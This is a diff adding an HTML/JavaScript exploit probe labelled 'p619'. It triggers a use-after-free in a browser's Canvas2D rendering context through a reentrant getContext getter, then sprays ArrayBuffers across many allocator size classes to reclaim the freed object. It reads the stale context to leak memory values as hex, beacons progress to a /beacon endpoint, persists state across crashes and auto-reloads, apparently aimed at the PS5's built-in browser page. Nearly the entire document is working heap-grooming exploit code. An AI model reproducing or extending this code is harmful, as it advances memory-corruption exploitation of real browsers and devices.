@@ -1,0 +1,150 @@
+<!--
+  p619: Canvas cross-type reclaim — AB size class finder.
+
+  PROVEN: AB spray before Canvas2D spray crashes lineWidth read (p563v8).
+  This means ABs CAN reclaim the freed Canvas2DRenderingContext slot.
+
+  This probe uses localStorage to persist across crashes:
+  - On each load, read the current test index
+  - Try ONE AB size
+  - If crash → that size matched (last beacon = "TESTING:sz=X")
+  - If safe → increment index, try next size on next load
+  - If an AB reclaims but lineWidth returns unexpected value → HIT
+
+  CRASH_CLASS: HIGH (expected crashes per test)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p619</title></head>
+<body><pre id="out">p619 canvas crosstype sizeclass</pre>
+<script>
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(m){
+  say(m);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P619-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2hex(f){_f64[0]=f;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/* bmalloc size classes to test */
+var SIZES=[
+  128,144,160,176,192,208,224,240,256,288,320,352,384,
+  416,448,480,512,576,640,704,768,832,896,1024,
+  1152,1280,1536,1792,2048,2560,3072,4096
+];
+
+var CANVAS_MARKER=7777.77;
+
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var stale=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    stale=c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer',opts);
+  return stale;
+}
+
+function main(){
+  /* Read test index from localStorage */
+  var idx=0;
+  try{idx=parseInt(localStorage.getItem('p619_idx'))||0;}catch(e){}
+
+  if(idx>=SIZES.length){
+    bk('DONE:all-sizes-tested-no-crash');
+    try{localStorage.removeItem('p619_idx');}catch(e){}
+    return;
+  }
+
+  var sz=SIZES[idx];
+
+  /* Pre-store NEXT index so if we crash, next load continues */
+  try{localStorage.setItem('p619_idx',String(idx+1));}catch(e){}
+
+  bk('BOOT:idx='+idx+'/'+SIZES.length);
+  bk('TESTING:sz='+sz);
+
+  /* Step 1: Trigger Canvas UAF */
+  var stale=triggerUAF();
+  if(!stale){bk('NO-UAF:sz='+sz);return;}
+
+  /* Step 2: Spray ABs of this size FIRST (before canvas spray) */
+  var abs=[];
+  for(var i=0;i<80;i++){
+    var ab=new ArrayBuffer(sz);
+    /* Fill with 0x41 pattern so we can detect reclaim */
+    var v=new Uint8Array(ab);
+    for(var j=0;j<sz;j++) v[j]=0x41;
+    abs.push(ab);
+  }
+  bk('AB-SPRAY:n='+abs.length+',sz='+sz);
+
+  /* Step 3: Safety net — spray Canvas2D contexts */
+  var sprayCtxs=[];
+  for(var i=0;i<40;i++){
+    var sc=document.createElement('canvas');
+    sc.width=1;sc.height=1;
+    var ctx=sc.getContext('2d');
+    if(ctx){
+      ctx.lineWidth=CANVAS_MARKER;
+      sprayCtxs.push(ctx);
+    }
+  }
+  bk('CTX-SPRAY:n='+sprayCtxs.length);
+
+  /* Step 4: Read through stale wrapper */
+  /* If AB reclaimed: lineWidth dereferences corrupted m_stateStack → crash */
+  /* If Canvas reclaimed: lineWidth = 7777.77 (marker) → safe */
+  var lw=-999;
+  try{
+    lw=stale.lineWidth;
+  }catch(e){
+    bk('READ-EXCEPTION:sz='+sz+',err='+e.message);
+    return;
+  }
+
+  if(Math.abs(lw-CANVAS_MARKER)<0.01){
+    bk('MISS:sz='+sz+',lw='+lw+' (canvas won)');
+  } else if(lw===1.0){
+    bk('DEFAULT:sz='+sz+' (context alive or default)');
+  } else {
+    bk('HIT:sz='+sz+',lw='+lw+',hex='+f2hex(lw)+' (AB data!)');
+    /* This means AB reclaimed AND we survived the read! */
+    /* Try reading more properties */
+    try{
+      var ml=stale.miterLimit;
+      bk('HIT-ML:'+ml+',hex='+f2hex(ml));
+    }catch(e){bk('ML-ERR:'+e.message);}
+    try{
+      var ga=stale.globalAlpha;
+      bk('HIT-GA:'+ga+',hex='+f2hex(ga));
+    }catch(e){bk('GA-ERR:'+e.message);}
+    try{
+      var t=stale.getTransform();
+      bk('HIT-TX:a='+f2hex(t.a)+',b='+f2hex(t.b)+',c='+f2hex(t.c)+',d='+f2hex(t.d)+',e='+f2hex(t.e)+',f='+f2hex(t.f));
+    }catch(e){bk('TX-ERR:'+e.message);}
+    /* Don't increment — we found it! Clear the counter */
+    try{localStorage.setItem('p619_found',String(sz));}catch(e){}
+    bk('FOUND:sz='+sz);
+    return;
+  }
+
+  /* Continue to next size on next page load */
+  bk('NEXT:will-test-sz='+SIZES[idx+1]);
+
+  /* Auto-reload after short delay to test next size */
+  /* On PS5, we reload the User's Guide page */
+  setTimeout(function(){
+    bk('RELOAD');
+    try{location.reload();}catch(e){}
+  }, 2000);
+}
+
+setTimeout(main,100);
+</script>
+</body></html>
